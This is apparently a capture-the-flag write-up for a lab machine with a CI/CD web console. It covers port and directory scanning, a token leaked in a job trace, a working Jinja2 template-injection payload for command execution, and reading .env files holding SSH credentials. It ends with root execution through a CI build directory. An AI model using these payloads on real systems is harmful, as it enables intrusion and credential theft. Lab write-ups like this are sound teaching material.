# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.070 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1160ms
rtt min/avg/max/mdev = 0.056/0.063/0.070/0.007 ms
```
# Ports scanning
```sh
sudo nmap -sS -sC -sV -p- --open --min-rate 5000 -Pn 172.17.0.2

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 d4:18:2e:bc:1e:06:58:73:24:7d:cd:f8:74:b3:72:41 (ECDSA)
|_  256 e6:a8:6b:06:d9:65:cd:48:ed:cf:b2:11:f1:ab:ba:3e (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: MASoftware \xC2\xB7 CI/CD Console
MAC Address: 36:EC:00:79:55:68 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Web
## Dir fuzzing
```sh
dirb http://172.17.0.2 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Sep 22 16:36:39 2026
URL_BASE: http://172.17.0.2/
WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

-----------------

GENERATED WORDS: 81628

---- Scanning URL: http://172.17.0.2/ ----
+ http://172.17.0.2/health (CODE:200|SIZE:3)

-----------------
END_TIME: Tue Sep 22 16:39:37 2026
DOWNLOADED: 81628 - FOUND: 1
```

```sh
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,zip,config,db
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,zip,config,db,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
health               (Status: 200) [Size: 3]
Progress: 32291 / 32291 (100.00%)
===============================================================
Finished
===============================================================
```

Found http://172.17.0.2/? exploring the web

This page is an internal CI/CD console
![[Pasted image 20260922164514.png]]

If we look at the failed one
```sh
curl http://172.17.0.2/api/jobs/126/trace
Running with gitlab-runner (shell executor) on self-hosted-01
$ echo "Deploying $CI_PROJECT_NAME on runner $CI_RUNNER_DESCRIPTION"
Deploying payments-api on runner self-hosted-01
$ env | grep -iE 'ci_|builds'    # TODO: remove debug
CI_REGISTRY=registry.masoftware.dl
CI_RUNNER_SHELL=/bin/bash
CI_JOB_STAGE=deploy
CI_BUILDS_DIR=/opt/ci/builds
CI_RUNNER_TOKEN=glrt-9ef2bb338750bea3f20e
$ id    # runner runs each job under its own user
uid=0(root) gid=0(root) groups=0(root)
$ ./deploy.sh
bash: ./deploy.sh: No such file or directory
Job failed: exit code 127
```

**Interesting** CI_RUNNER_ROKEN=glrt-9ef2bb338750bea3f20e
## Params fuzzing
## Other ids
It could be interesting to search for other jobs ids

```sh
ffuf -u http://172.17.0.2/api/jobs/FUZZ/trace -w ./numeros.txt -fw 7

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/api/jobs/FUZZ/trace
 :: Wordlist         : FUZZ: /home/codebylauti/workspace/dockerlabs/intermediate/pipepwned/numeros.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 7
________________________________________________

0125                    [Status: 200, Size: 274, Words: 33, Lines: 8, Duration: 11ms]
0127                    [Status: 200, Size: 232, Words: 23, Lines: 8, Duration: 11ms]
0128                    [Status: 200, Size: 223, Words: 28, Lines: 9, Duration: 11ms]
0126                    [Status: 200, Size: 559, Words: 55, Lines: 15, Duration: 11ms]
:: Progress: [10000/10000] :: Job [1/1] :: 3636 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
## Other endpoints
```sh
ffuf -u http://172.17.0.2/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

pipelines               [Status: 200, Size: 480, Words: 1, Lines: 2, Duration: 29ms]
```

```sh
ffuf -u http://172.17.0.2/api/jobs/126/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/api/jobs/126/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

trace                   [Status: 200, Size: 559, Words: 55, Lines: 15, Duration: 10ms]
:: Progress: [81643/81643] :: Job [1/1] :: 3333 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
```
## New pipeline endpoint
After looking how the previous trace is handled it it interesting to try and inject command in those parameters.

```sh
curl -s -X POST http://172.17.0.2/pipelines/new -d "name=whoami" -d "ref=whoami" | grep code

<p class="banner">Pipeline <strong>whoami</strong> sent to queue for ref <code>whoami</code> on runner <em>self-hosted-01</em>.</p>
<p class="muted">Target Ref: <code>whoami</code></p>
```

Unfortunately, we couldn't inject bash commands

Since the app is running Gunicorn we could try SSTI for Jinja2

```sh
curl -s -X POST http://172.17.0.2/pipelines/new -d "name={{7*7}}" -d "ref={{7*7}}" | grep code

<p class="banner">Pipeline <strong>49</strong> sent to queue for ref <code>49</code> on runner <em>self-hosted-01</em>.</p>
<p class="muted">Target Ref: <code>{{7*7}}</code></p>
```

The field *ref* is vulnerable

```sh
curl -s -X POST http://<IP>/pipelines/new -d "name=test" -d "ref={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

```
uid=1000(ciapp) gid=1000(ciapp) groups=1000(ciapp)
```

# Privilege escalation
## Enumeration as ciapp
After some enumeration with abusing the ref vulnerability, while listing the files ciapp owns, there's an env file that leaks SSH credentials

```sh
curl -s -X POST http://172.17.0.2/pipelines/new -d "name=" -d "ref={{config.__class__.__init__.__globals__['os'].popen('find / -user ciapp 2>/dev/null').read()}}"
```

```
/opt/app/.env
```

```sh
curl -s -X POST http://172.17.0.2/pipelines/new -d "name=" -d "ref={{config.__class__.__init__.__globals__['os'].popen('cat /opt/ci/.env').read()}}"
```

```
# Runner base config: /etc/gitlab-runner/config.toml
CI_REGISTRY=registry.masoftware.dl
CI_RUNNER_TOKEN=glrt-9ef2bb338750bea3f20e

DEVOPS_SSH_USER=devops
DEVOPS_SSH_PASS=MAS0ftware_202607!
```

## Enumeration as devops
### User's flag
``` sh
cat user_flag.txt
30e3108dbbf867259a30a459770dd25c
```

```sh
find / -perm -2000 2>/dev/null
/var/local
/var/log/journal
/var/mail
/usr/bin/chage
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/local/share/fonts
/opt/ci/builds
/opt/ci/builds/.processed
```

The file **/opt/ci/build** seems interesting

If we look at the CI/CD configuration we found previously in the web

```sh
cat /etc/gitlab-runner/config.toml
concurrent = 1
check_interval = 20
log_level = "info"

[session_server]
session_timeout = 1800

[[runners]]
name = "self-hosted-01"
url = "https://gitlab.masoftware.dl/"
id = 1
token = "glrt-9ef2bb338750bea3f20e"
executor = "shell"
# Script gets executed with the privileges of the user running the runner service
builds_dir = "/opt/ci/builds"
environment_file = "/opt/ci/.env"

# TODO: service runs as root, migrate to a non-root user
```

```sh
ps aux | grep runner
root          18  0.0  0.0   4372  3304 ?        S    00:00   0:00 /bin/bash /opt/ci/runner.sh
devops       491  0.0  0.0   4032  2180 pts/0    S+   01:42   0:00 grep --color=auto runner
```

```sh
echo 'whoami > /tmp/test.txt' > test.sh
cat /tmp/test.txt
root
```